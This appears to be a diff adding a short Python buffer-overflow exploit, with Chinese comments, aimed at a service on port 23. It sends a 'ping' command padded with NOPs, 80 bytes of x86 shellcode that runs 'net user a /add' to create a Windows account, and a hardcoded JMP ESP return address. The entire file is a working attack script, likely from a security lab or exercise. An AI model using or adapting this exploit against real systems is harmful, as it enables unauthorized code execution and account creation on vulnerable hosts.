@@ -1,0 +1,20 @@
+import socket
+import os
+
+def main():
+    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    sock.connect(('127.0.0.1',23))  
+    s = sock.recv(2022)   # 设置接受对方发送的数据字节数量
+
+    # 下面80个字符shellcode具有增加a帐户的功能
+    shellcode = b'\x55\x8B\xEC\x33\xFF\x57\x83\xEC\x0C\xC6\x45\xF0\x6E\xC6\x45\xF1\x65\xC6\x45\xF2\x74\xC6\x45\xF3\x20\xC6\x45\xF4\x75\xC6\x45\xF5\x73\xC6\x45\xF6\x65\xC6\x45\xF7\x72\xC6\x45\xF8\x20\xC6\x45\xF9\x61\xC6\x45\xFA\x20\xC6\x45\xFB\x2F\xC6\x45\xFC\x61\xC6\x45\xFD\x64\xC6\x45\xFE\x64\x8D\x45\xF0\x50\xB8\xC7\x93\xBF\x77\xFF\xD0' 
+    jmpesp = b'\xd8\xfc\x93\x7c'
+    sendStr = b'ping ' + b'\x90'*4 + shellcode + b'\x90'*(1012-80-4)+ jmpesp + b'a'* (2000-1012)
+    
+    sock.send(sendStr)  #发送shellcode
+    sock.send(b'\r\n')
+    s = sock.recv(2022)
+    print(s)
+
+if __name__ == '__main__':
+    main()
